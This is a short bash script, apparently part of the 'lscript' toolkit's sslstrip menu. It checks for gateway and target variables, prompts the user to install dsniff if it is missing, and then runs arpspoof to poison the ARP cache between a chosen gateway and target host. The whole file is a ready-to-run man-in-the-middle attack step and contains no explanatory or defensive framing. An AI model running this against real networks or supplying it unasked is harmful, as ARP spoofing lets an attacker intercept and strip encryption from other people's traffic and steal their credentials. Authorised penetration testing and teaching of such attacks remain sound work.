#! /bin/bash
if [[ -z "$GATEINT" || -z "$TARGIP" || -z "$GATENM" ]]
then
	echo -e "Missing MITM variables (GATEINT, TARGIP, GATENM). Launch from lscript sslstrip menu."
	exit 1
fi
if ! command -v arpspoof >/dev/null 2>&1
then
	echo -e "arpspoof not found. Install dsniff: apt-get install -y dsniff"
	exit 1
fi
arpspoof -i "$GATEINT" -t "$GATENM" "$TARGIP"
read -r
